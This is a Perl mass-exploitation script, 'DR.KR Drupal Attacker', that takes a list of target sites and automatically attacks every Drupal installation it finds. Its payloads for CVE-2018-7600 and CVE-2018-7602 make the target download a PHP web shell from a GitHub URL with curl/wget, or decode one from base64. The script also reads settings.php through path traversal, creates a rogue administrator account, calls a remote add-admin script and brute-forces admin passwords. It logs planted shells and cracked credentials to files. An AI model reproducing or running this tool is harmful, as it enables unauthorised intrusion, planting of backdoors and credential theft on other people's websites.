#!/usr/bin/perl
#MIXED BY DR.KR
#C https://www.facebook.com/spyus.teamx
#M http://www.spyus.org
use LWP::Simple;
use URI::URL;
use LWP::UserAgent;
use Getopt::Long;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5 qw(md5 md5_hex);
use MIME::Base64;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use URI::URL;
use DBI;
use IO::Socket;
use IO::Socket::INET;
use threads;

system ("DR.KR DRUPAL ATTACKER V1");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'blue on_green'),"\n";print color('reset');
print colored ("#C                                   [ MIXED BY DR.KR ]                                   #",'white on_green'),"\n";print color('reset');
print colored ("#W                                  [ UNDERGROUND KINGZ ]                                 #",'white on_green'),"\n";print color('reset');
print colored ("#N                                 [   DRUPAL ATTACKER  ]                                 #",'white on_green'),"\n";print color('reset');
print colored ("#V                              [ V 1 CREATED BY SPYUS TEAM ]                             #",'white on_green'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'blue on_green'),"\n";print color('reset');
$spyuscopyright = "  
DR.KR DRUPAL ATTACKER V1
MORE AT SPYUS.ORG\n
SPYUS TEAM 2018 \n
\n";
print $spyuscopyright;
print color('bold yellow'),"[";
print color('bold red'),"1";
print color('bold yellow'),"] ";
print color('bold white'),"START ATTACK ? \n";

my $drkrstartattack = <STDIN>;
chomp $drkrstartattack;
if($drkrstartattack eq '1'){
beastmode();
}
sub beastmode($site){
print "HOW MANY THEARDS [NUMBER] : ";
my $thr = <STDIN>;
chomp $thr;
print "YOUR TARGET LIST : ";
my $file = <STDIN>;
chomp $file;

open(sites,"<".$file) or die $!;
while($site = <sites>)
{
chomp($site);
push(@threads, threads->create (\&bot, $site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
}
eval {
$_->join foreach @threads;
@threads = ();
};
close(sites);

sub bot(){

cmsdetc();
}
sub cmsdetc($site){
##$ua = LWP::UserAgent->new(keep_alive => 1);
$ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (20);
my $cms = $ua->get("$site")->content;
$dursite = $site . '/user/login';
my $durcms = $ua->get("$dursite")->content;
my $zcmsd = $ua->get("$site/CHANGELOG.txt")->content;
my $ezcmsd = $ua->get("$site/core/CHANGELOG.txt")->content;
my $tzcmsd = $ua->get("$site/includes/bootstrap.inc")->content;

if($cms =~/Drupal|drupal|baseUrl|sites/) {
    open(save, '>>drupalsite.txt');
    print save "$site\n";   
    close(save);
    vers();
}
elsif($durcms =~/Drupal|drupal|baseUrl|sites/) {
    open(save, '>>drupalsite.txt');
    print save "$site\n";   
    close(save);
	vers();
}
elsif($ezcmsd =~/Drupal|drupal|baseUrl|sites/) {

    open(save, '>>drupalsite.txt');
    print save "$site\n";   
    close(save);
	vers();
}
elsif($tzcmsd =~/Drupal|drupal|baseUrl|sites/) {

    open(save, '>>drupalsite.txt');
    print save "$site\n";   
    close(save);
	vers();
}
sub vers(){

$getversion = $ua->get("$site/CHANGELOG.txt")->content;

if($getversion =~/Drupal (.*?),/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white')," Version";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"$1";
print color('bold white'),"\n";
open (TEXT, '>>Result/version.txt');
print TEXT "Drupal=> $site => $1\n";
close (TEXT);
if($cms =~/7./) {
drupalo();
drupalx();
}
elsif($cms =~/8./) {
drupaloo();
}
}else{
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Version";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
drupalo();
drupalx();
drupaloo();
avatar();
#drupal();
csrf();
}
}
sub drupalo(){

my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=curl https://raw.githubusercontent.com/DRIV3RKR/q9z5ep1ta9wu/master/lite.php | wget https://raw.githubusercontent.com/DRIV3RKR/q9z5ep1ta9wu/master/lite.php";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
if($body =~ s/$regex//){
my $newout=$1;
$formcraft2up="$site/?q=file/ajax/name/%23value/$newout";
my $responses = $ua->post($formcraft2up, Content-Type => 'application/json', Content => ['form_build_id' => $newout]);
$addblockup="$site/payload.php";
my $checkaddblock = $ua->get("$addblockup")->content;
if($checkaddblock =~/Spider Project/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE V7";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold green'),"[ShellLink] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=curl+-o+izom.php+https://raw.githubusercontent.com/DRIV3RKR/q9z5ep1ta9wu/master/lite.php";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
if($body =~ s/$regex//){
my $newout=$1;
$formcraft2up="$site/?q=file/ajax/name/%23value/$newout";
my $responses = $ua->post($formcraft2up, Content-Type => 'application/json', Content => ['form_build_id' => $newout]);
$addblockup="$site/izom.php";
my $checkaddblock = $ua->get("$addblockup")->content;
if($checkaddblock =~/Spider Project/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE V7";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold green'),"[ShellLink] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=mv+sites/default/files/.htaccess+htaccessx;curl+-o+sites/default/files/info.php+'https://raw.githubusercontent.com/DRIV3RKR/q9z5ep1ta9wu/master/lite.php'";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
if($body =~ s/$regex//){
my $newout=$1;
$formcraft2up="$site/?q=file/ajax/name/%23value/$newout";
my $responses = $ua->post($formcraft2up, Content-Type => 'application/json', Content => ['form_build_id' => $newout]);
$addblockup="$site/sites/default/files/info.php";
my $checkaddblock = $ua->get("$addblockup")->content;
if($checkaddblock =~/Spider Project/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE V7";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold green'),"[ShellLink] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=echo+PD9waHAgaWYoaXNzZXQoJF9GSUxFU1sidXNlcmZpbGUiXVsibmFtZSJdKSl7ICR1cGxvYWRkaXIgPSBnZXRjd2QoKSAuICIvIjsgJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gYmFzZW5hbWUoJF9GSUxFU1sidXNlcmZpbGUiXVsibmFtZSJdKTsgZWNobyAiPHA+IjsgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1c2VyZmlsZSJdWyJ0bXBfbmFtZSJdLCAkdXBsb2FkZmlsZSkpIHsgZWNobyAiVXBsb2FkIFN1Y2Nlc3NmdWxcbiI7IH0gZWxzZSB7IGVjaG8gIkZhaWxlZCBUbyBVcGxvYWQiO30gZWNobyAiPC9wPiI7IGVjaG8gIjxwcmU+IjsgZWNobyAiSW5mb3JtYXRpb24gOlxuIjsgZWNobyAiWW91ciBEaXJlY3RvcnkgSXMgOiI7IGVjaG8gZ2V0Y3dkKCkgLiAiXG4iOyBwcmludF9yKCRfRklMRVMpOyBpZiAoJF9GSUxFU1sidXNlcmZpbGUiXVsiZXJyb3IiXSA9PSAwKXsgZWNobyAiPGJyPjxicj48YSBocmVmPVwieyRfRklMRVNbInVzZXJmaWxlIl1bIm5hbWUiXX1cIiBUQVJHRVQ9X0JMQU5LPnskX0ZJTEVTWyJ1c2VyZmlsZSJdWyJuYW1lIl19PC9hPjxicj48YnI+IjsgZWNobyBnZXRjd2QoKSAuICJcbiI7IH0gZWNobyAiPC9wcmU+IjsgfSBlY2hvICI8Zm9ybSBlbmN0eXBlPVwibXVsdGlwYXJ0L2Zvcm0tZGF0YVwiIGFjdGlvbj1cInskX1NFUlZFUlsiUEhQX1NFTEYiXX1cIiBtZXRob2Q9XCJQT1NUXCI+IjsgZWNobyAiPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiTUFYX0ZJTEVfU0laRVwiIHZhbHVlPVwiNTEyMDAwXCIgLz4iOyBlY2hvICJTZWxlY3QgWW91ciBGaWxlIDogPGlucHV0IG5hbWU9XCJ1c2VyZmlsZVwiIHR5cGU9XCJmaWxlXCIgLz4iOyBlY2hvICI8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiVXBsb2FkXCIgLz4iOyBlY2hvICI8L2Zvcm0+IjsgZWNobyAiU3BpZGVyIFByb2plY3QiOyBleGl0OyA/Pg+base64+--decode%7C+tee+accesson.php";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
if($body =~ s/$regex//){
my $newout=$1;
$formcraft2up="$site/?q=file/ajax/name/%23value/$newout";
my $responses = $ua->post($formcraft2up, Content-Type => 'application/json', Content => ['form_build_id' => $newout]);
$addblockup="$site/accesson.php";
my $checkaddblock = $ua->get("$addblockup")->content;
if($checkaddblock =~/Spider Project/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE V7";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold green'),"[ShellLink] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=id;uname+-a";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
if($body =~ s/$regex//){
my $newout=$1;
$formcraft2up="$site/?q=file/ajax/name/%23value/$newout";
my $responses = $ua->post($formcraft2up, Content-Type => 'application/json', Content => ['form_build_id' => $newout]);

if ($responses->content =~ /uid=(.*?)groups/) {
my $rcen=$1;
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"RCE Good Work!!";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold green'),"[RCEVuln] => uid=$rcen\n";
open (TEXT, '>>rcevuln.txt');
print TEXT "$site\nuid=$rcen\n";
close (TEXT);
}else{
my $exploit = "$site/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";

my $response = $ua->post($exploit, Content => ["form_id" => "user_register_form", "_drupa_ajax" => "1", "mail[#post_render][]" => "exec", "mail[#type]" => "markup", "mail[#markup]" => "echo Vuln!! patch it Now!> pwd.html"]);

my $cano = "$site/pwd.html";
my $checkcano = $ua->get("$cano")->content;
if ($checkcano =~ /Vuln/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-V7 İndex upload";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold green'),"[ShellLink] => $cano\n";
open (TEXT, '>>index.txt');
print TEXT "$cano\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==>";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE  V7";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
}
}
}
}
}
}
}
}
}
}
sub drupalx(){

my $addblockurl = "$site/?q=node/99/delete&destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=id;uname+-a";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'node_delete_confirm', $ajax => 'form_id','form_token' => '[CSRF-TOKEN]']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
if($body =~ s/$regex//){
my $newout=$1;
$formcraft2up="$site/?q=file/ajax/actions/cancel/%23options/path/$newout";
my $responses = $ua->post($formcraft2up, Content-Type => 'application/json', Content => ['form_build_id' => $newout]);

if ($responses->content =~ /uid=(.*?)groups/) {
my $rcen=$1;
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7602";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold green'),"[RCEVuln] => uid=$rcen\n";
open (TEXT, '>>rcevuln.txt');
print TEXT "$site\nuid=$rcen\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==>";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7602";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
}
sub drupaloo(){

my $addblockurl = "$site/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
my $wget = "wget https://raw.githubusercontent.com/DRIV3RKR/q9z5ep1ta9wu/master/lite.php";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_register_form','_drupal_ajax' => '1','mail[a][#post_render][]' => 'exec','mail[a][#type]' => 'markup','mail[a][#markup]' => $wget]);

$addblockup="$site/payload.php";
my $checkaddblock = $ua->get("$addblockup")->content;
if($checkaddblock =~/Spider Project/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE V8";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"]";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"[Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
my $addblockurl = "$site/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
my $wget = "wget%20https://raw.githubusercontent.com/DRIV3RKR/q9z5ep1ta9wu/master/lite.php";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id'=> 'user_register_form','_drupal_ajax'=> '1','timezone[a][#lazy_builder][]'=> 'exec','timezone[a][#lazy_builder][][]'=> $wget]);

$addblockup="$site/payload.php";
my $checkaddblock = $ua->get("$addblockup")->content;
if($checkaddblock =~/Spider Project/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE V8";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"]";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"[Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
my $addblockurl = "$site/user/register?element_parents=account%2Fmail%2F%23value&ajax_form=1&_wrapper_format=drupal_ajax";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id'=>'user_register_form','_drupal_ajax'=>'1','mail%5B%23type%5D'=>'markup','mail%5B%23post_render%5D%5B%5D'=>'exec','mail%5B%23markup%5D'=>'id']);

if ($response->content =~ /uid=(.*?)groups/) {
my $rcen=$1;
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold green'),"[RCEVuln] => uid=$rcen\n";
open (TEXT, '>>Result/rcevuln.txt');
print TEXT "$site\nuid=$rcen\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==>";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-7600-Drupal-RCE  V8";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
}
}
sub avatar(){

$url = "$site/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/drupal_hash_salt/g){
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-9205";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>config.txt');   
    print save "[druconfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"CVE-2018-9205";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub csrf(){


$mail = 'new_admin@new_admin.com';
$exploit = "$site/admin/people/create?render=overlay&render=overlay";
$response = $ua->post($exploit, Content-Type => 'multipart/form-data', Content => ['name' => 'new_admin', mail => $mail, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc' , 'form_id' => 'user_register_form' , 'op' => 'Create new account']);

if ($response =~ /200/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"2012-CSRF";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"]";
print color('bold white'),"URL : $site\n";
print color('bold white'),"USER : $mail\n";
print color('bold white'),"PASS : new_password\n";
open (TEXT, '>>adminadd.txt');
print TEXT "\nURL : $site\n";
print TEXT "USER : $mail\n";
print TEXT "PASS : new_password\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==>";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"2012-CSRF";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub drupal(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);


# IF LINK NOT WORK $drupalink reupload the script to your own host get it form here ====> https://pastebin.com/raw/wPAbtyJ4
$drupalink = "http://www.cleanuptheworld.org/images/au/mast/gg.php";
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="gassrini";
$pass  ="admin";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"URL : $dr\n";
print color('bold white'),"USER : $admin\n";
print color('bold white'),"PASS : $pass\n";
open (TEXT, '>>adminadd.txt');
print TEXT "\nURL : $dr\n";
print TEXT "USER : $admin\n";
print TEXT "PASS : $pass\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
drb();
}

sub drb{
@patsd=('123456','admin123','123','1234','admin','password','root');
foreach $pmasd(@patsd){
chomp $pmasd;
$druser = admin;
$drupass = $pmasd;
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold red'),"[";
print color('bold white'),"Trying: $drupass";
print color('bold red'),"] \n";

$drupal = $site . '/user/login';
$redirect = $site . '/user/1';

$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
$response = $ua->request($drupalbrute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print color('bold red'),"[";
print color('bold green'),"Drupal";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold red'),"[";
print color('bold white'),"Crack Pass --> User: $druser Pass: $drupass";
print color('bold red'),"] \n";

open (TEXT, '>>crackeddrupal.txt');
print TEXT "$drupal => User: $druser Pass: $drupass\n";
close (TEXT);
next OUTER;
}
}
}
}
}
